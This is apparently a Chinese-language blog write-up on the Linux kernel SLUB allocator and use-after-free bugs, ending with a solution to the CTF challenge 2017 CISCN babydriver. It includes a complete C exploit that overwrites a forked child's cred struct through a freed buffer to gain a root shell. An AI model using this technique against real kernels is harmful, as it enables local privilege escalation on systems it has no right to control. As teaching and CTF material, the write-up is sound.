---
title: Linux Kernel UAF
date: 2025-12-01 9:30:38
categories: Linux
tags:
mathjax:
top:
---

## 简介

## 虚拟内存基础

由于 Slab 分配器是一个相当复杂且高级的主题，但对于开始 Linux 内核编程来说非常必要，我写了这篇文档来解释它是如何工作的。我会先简要说明 Buddy 分配器，以便让大家理解为什么 Slab 分配器在 Linux 内核中很有用，然后再详细介绍 Slab 分配器。本篇文章基于 Linux 5.3.13 内核（撰写本文时的最新稳定版本 — 2019 年 11 月 15 日 22:13:17 CET）。我将以 x86-64 系统为例，页面大小如下：

- 普通页：4KB（在内核中定义为 `PAGE_SIZE` 常量）
- 大页：2MB 或 1GB

- 虚拟内存 = **虚拟地址空间** → **页表** → **物理页**
- 每个页（page）通常为 4KB。
- **TLB (Translation Lookaside Buffer)**：硬件缓存页表项，加速地址翻译。
- 对于大块内存，分配整页最合适；
- 对于小块（如 128B），则需要专门的小对象分配器 → slab/slub。

翻译是通过线性页表完成的：

![线性页表](https://ruffell.nz/assets/images/2019_068.png)

大多数现代计算机都使用[转换后备缓冲区](https://en.wikipedia.org/wiki/Translation_lookaside_buffer)，它是最近使用的虚拟地址的缓存。这是在硬件中实现的，并且速度非常快。

![TLB](https://ruffell.nz/assets/images/2019_069.png)

------

## 三大内核内存分配器

| 分配器   | 特点                                              | 适用场景                    |
| -------- | ------------------------------------------------- | --------------------------- |
| **SLOB** | 简单链表 + 首次适配算法（first-fit）              | 嵌入式、小内存系统          |
| **SLAB** | 预分配对象池（slab 缓存），对象重用，含丰富元数据 | 通用系统（2.6.23 以前默认） |
| **SLUB** | SLAB 的简化版：移除复杂队列与冗余元数据           | 现代内核默认分配器          |

------

## SLUB 设计精髓

- 每个对象池（`kmem_cache`）对应一种对象大小（如 8B、16B、32B...）。

- 每个 CPU 维护一个局部缓存 (`kmem_cache_cpu`)，避免频繁锁争用。

- 每个 slab 的元数据极少，仅保留：

  ```c
  struct page {
      void *freelist;   // 指向 slab 中第一个空闲对象
      unsigned short inuse;   // 正在使用的对象数
      unsigned short offset;  // 下一个对象的偏移
  };
  ```

- 当 `inuse == 0` 时，该 slab 可被回收。

------

## kmalloc() 调用分析

### kmalloc()

```c
static __always_inline void *kmalloc(size_t size, gfp_t flags)
{
    if (__builtin_constant_p(size)) {
        ...
        return kmem_cache_alloc_trace(kmalloc_caches[index], flags, size);
    }
    return __kmalloc(size, flags);
}
```

若 `size` 为常量（编译期确定），走 **fastpath**；否则进入 `__kmalloc()`。

------

### __kmalloc()

```c
void *__kmalloc(size_t size, gfp_t flags)
{
    struct kmem_cache *s;
    ...
    s = kmalloc_slab(size, flags);
    ret = slab_alloc(s, flags, _RET_IP_);
    return ret;
}
```

关键操作：

1. 选择合适的 slab cache（通过 `kmalloc_slab()`）
2. 从该 slab 中分配对象（通过 `slab_alloc()`）

------

### kmalloc_slab()

根据对象大小查表选择 slab：

```c
static s8 size_index[24] = {
  /* index for sizes 8~192 bytes */
  ...
  [15] = 7, /* 128 bytes */
};
```

即 128B 大小的对象对应第 7 个 slab cache。

### slab_alloc() → slab_alloc_node()

`slab_alloc_node()` 是真正的内存分配核心逻辑：

1. 调用 `slab_pre_alloc_hook()` 检查分配合法性。

2. 从当前 CPU 的缓存结构 (`kmem_cache_cpu`) 获取：

   ```c
   object = c->freelist;
   page   = c->page;
   ```

3. 若无可用对象，则进入慢路径 `__slab_alloc()` 新建或借用 slab。

4. 若有可用对象：

   - `next_object = get_freepointer(s, object);`
   - 使用 `cmpxchg` 原子交换更新 freelist。
   - 返回已分配对象地址。

------

## GFP 标志位与可阻塞性

分配时第二个参数为 `GFP_KERNEL`：

```c
#define GFP_KERNEL (__GFP_RECLAIM | __GFP_IO | __GFP_FS)
```

→ 表示此分配可触发内存回收（可睡眠），即调用路径允许阻塞。

由此：

- `might_sleep_if(gfpflags_allow_blocking(flags));`
- 表明 `kmalloc(..., GFP_KERNEL)` 在必要时可以睡眠等待内存。

------

## 原子性与无锁分配

`cmpxchg_double()` 是 SLUB 的关键机制：

```c
if (!this_cpu_cmpxchg_double(
    s->cpu_slab->freelist, s->cpu_slab->tid,
    object, tid,
    next_object, next_tid(tid))) {
    goto redo;
}
```

含义：

- 同时原子比较并更新 `freelist` 与 `tid`。
- 若在期间有其他 CPU 修改了 freelist，则失败 → 重新尝试。

→ 实现了 **lockless per-CPU 分配**。

## 基础知识

> SLUB 分配器

与用户态的程序相似，内核态也有自己的堆区，其常见的使用方法是通过`kmaloc()`与`kfree()`函数来进行申请与释放。同样的，内核态中的堆方面也存在有用户态所存在的漏洞。今天以 UAF 这一常见漏洞类型来进行简单的讲解。

Linux 内核的堆内存管理机制和用户态是不一样的。Linux 内核使用源自于 Solaris 的一种方法，它是将内存作为对象按照大小进行分配，被称为 slab 高速缓存。现在的 Linux kernel 存在有 3 中管理方法 slab/slub/slob。其中 slab 是基础，slub 针对大型机，slob 主要针对嵌入式系统。常见常用的便是 slub 这种管理方式。

要学习堆漏洞的利用，首先要了解其使用的堆内存管理机制。Linux 内核使用了源自于 Solaris 的一种方法，它是将内存作为对象按照大小进行分配，被称为 slab 高速缓存。现在的 Linux Kernel 存在有 3 种管理方法 slab/slub/slob。其中 slab 是基础，slub 针对大型机，slob 主要针对嵌入式系统。现在常用的便是 slub 这种管理方式。

和 ptmalloc 中大部分 bins 以 0x10 为单位分割不同，slub 级别是以 2^n 为单位进行管理。

通过`cat /proc/slabinfo`可以看到 slub 的具体情况。

```

```

而且在调用 kmalloc 的时候，根据值是不是常量，还会用不同的方式进行调用。如果值是常量，将直接去选择对应的`kmem_cache`。

对于 SLUB 中的`free`与`kmalloc`，可以简单的认为 free 以后，再次 malloc 就会拿到 free 的那一块内存。

**那块刚被 free 的内存（大小 0xa8）会重新进入 slab allocator 的空闲列表，等待下次分配。**



## UAF

和用户态的 UAF 相似，都是在某一个结构体释放后忘记将指针清空。

常见两种情况：

1. 结构体 A 本身不存在函数指针，但是`free`后可以 edit，那么需要让另外一个含有函数指针的结构体 B 放入相同位置，之后修改函数指针。
2. 结构体 A 本身有函数指针，但是 free 之后无法 edit，这时候需要分配一个可以 edit 的结构体 B 放入相同位置，修改函数指针。

一般结构体 A 是题目提供的，而结构体 B 可以调用 Linux 操作系统自带的一些设备获得。

对于第二种情况，常用结构体是`msg_msg`，其可以申请的 size 十分灵活，但是头部的 0x30 个字节无法控制。

>例题 2017ciscn_babydriver

```

```


与用户态 glibc 中分配 fake chunk 后覆写 `__free_hook` 这样的手法类似，我们同样可以通过覆写 freelist 中的 next 指针的方式完成内核空间中任意地址上的对象分配，并修改一些有用的数据以完成提权。

内核中 cred 结构体的大小一般约为 0xa8（不同 kernel 大小略微不同）。

内核 kmalloc 会从 slab 缓存（kmalloc-192 或 kmalloc-256）中分配一块内存，而 cred 结构体在内核中一般也是从 **同一个 slab 缓存** 分配的。

由于内核是基于 slab 的：

> **如果 cred 结构体刚被 free，下一次 kmalloc 就很容易拿到同一块内存。**

## 例题 2017ciscn_babydriver

### 分析

启动内核出错：

<img src="../assets/image-20251117135851186.png" alt="image-20251117135851186" style="zoom:50%;" />

这是因为 qemu 在启动时尝试使用 kvm 硬件加速，但系统上没有可用的 kvm模块或权限不足。

加载 kvm 模块：

```shell
sudo modprobe kvm_intel   # Intel CPU
sudo modprobe kvm_amd     # AMD CPU
```

查看分析 init 文件：

```shell
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

发现 flag 文件在 root 目录下，并且只有 root 用户才可以读取。

并且系统初始化时加载了`lib/modules/4.4.72`目录下的`babydriver.ko`模块，所以漏洞应该在这个模块中。

```shell
mkdir rootfs && cd rootfs
cpio -idvm < ../rootfs.cpio
```

然后将模块文件复制出来：

```shell
cp ./rootfs/lib/modules/4.4.72/babydriver.ko ./                 
```

ida 反编译分析：

- 分配一个字符设备号`babydev_no`
- 初始化`cdev`结构体
- 注册字符设备到内核
- 创建`/sys/class/babydev`
- 创建`/dev/babydev`设备节点
- 注册失败则清理资源。

<img src="../assets/image-20251117140932416.png" alt="image-20251117140932416" style="zoom:50%;" />

- babyopen

申请 0x40 大小的内存，并把地址存在`device_buf`，`device_buf_len=0x40`。

<img src="../assets/image-20251117141457421.png" alt="image-20251117141457421" style="zoom:50%;" />

- babyread

检查`device_buf`是否存在，存在则比较其大小和用户读取请求的长度。

<img src="../assets/image-20251117141342300.png" alt="image-20251117141342300" style="zoom:50%;" />

但是这里的伪代码是有问题的，`copy_to_user`的参数没有反编译完整。

`copy_to_user`的原型：

```c
unsigned long copy_to_user(void __user *to, const void *from, unsigned long n);
```

通过快捷键`y`修改`copy_to_user`原型添加两个参数类型：

![image-20251117143247052](../assets/image-20251117143247052.png)

修复后的伪代码：

![image-20251117143226303](../assets/image-20251117143226303.png)

所以下面的代码逻辑是：如果`device_buf`大于用户请求长度，则将`device_buf`复制用户请求大小的长度到用户态`buffer`参数中。

- babywrite

`copy_to_user`的参数同样有问题，使用上面的方法修改一下：



<img src="../assets/image-20251117144648067.png" alt="image-20251117144648067" style="zoom:50%;" />

这里可以结合汇编分析出`v4`的值是从`length`参数获取的：

<img src="../assets/image-20251117144844192.png" alt="image-20251117144844192" style="zoom:50%;" />

- babyrelease

通过`kfree`释放`device_buf`，但是这里释放后未将指针置为零，所以存在 UAF 漏洞。

<img src="../assets/image-20251117141542102.png" alt="image-20251117141542102" style="zoom:50%;" />

- babyioctl

如果`command`参数的值等于`0x10001`，则释放掉`device_buf`，然后再申请`v4`大小的`device_buf`。

<img src="../assets/image-20251117143741195.png" alt="image-20251117143741195" style="zoom:50%;" />

就是当用户态调用以下代码时执行：

```shell
ioctl(fd, 0x10001, size);
```

`v4`的值是`v3`的值，不过`v3`的值是哪里来的？

结合汇编分析一下可以发现是从`arg`参数获取到的。

<img src="../assets/image-20251117143650644.png" alt="image-20251117143650644" style="zoom:50%;" />

### exp

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <string.h>

char buf[0x40]={0};

int main()
{
    //open两次设备，分配两个对象
    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);
    
    //申请0xa8大小的device_buf，cred结构体大小
    ioctl(fd1,0x10001,0xa8);
    
    //关闭设备，释放fd1的device_buf。
    close(fd1);
    
    //fork分配cred结构体，相当于kmalloc(0xa8)，这样会复用被释放的fd1的device_buf
    //这样fd2的device_buf和新分配的cred结构体就指向同一内核堆空间
    int pid = fork();
    
    if(pid<0){
        printf("fork error\n");
    }else if(pid==0){ //判断是否为子进程
        //覆盖cred结构体。因为堆块重叠，实际覆盖了
        //直接覆盖子进程的 cred 结构体前 32 字节 → 把 uid/gid 等字段改成 0 → 提权为 root。
        write(fd2,buf,32);
        
        //获取root权限后返回一个shell
        if(getuid()==0){
            printf("Hacked\n");
            system("/bin/sh\n");
            return 0;
        }
    }else{
        wait(NULL);
    }
    close(fd2);
    return 0;
}
```

编译运行：

```shell
gcc ./exp.c -static -masm=intel -g -o exp    
cp exp rootfs/exp
cd rootfs 
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > exp.cpio
./gen_cpio.sh core.cpio
mv exp.cpio ..
boot.sh
```

成功获取 root 权限，然后即可读取 flag。

<img src="../assets/image-20251117145535870.png" alt="image-20251117145535870" style="zoom:50%;" />

## 参考

>[Linux内核的内存管理与漏洞利用案例分析 - 有价值炮灰](https://evilpan.com/2020/03/21/linux-slab/#前言)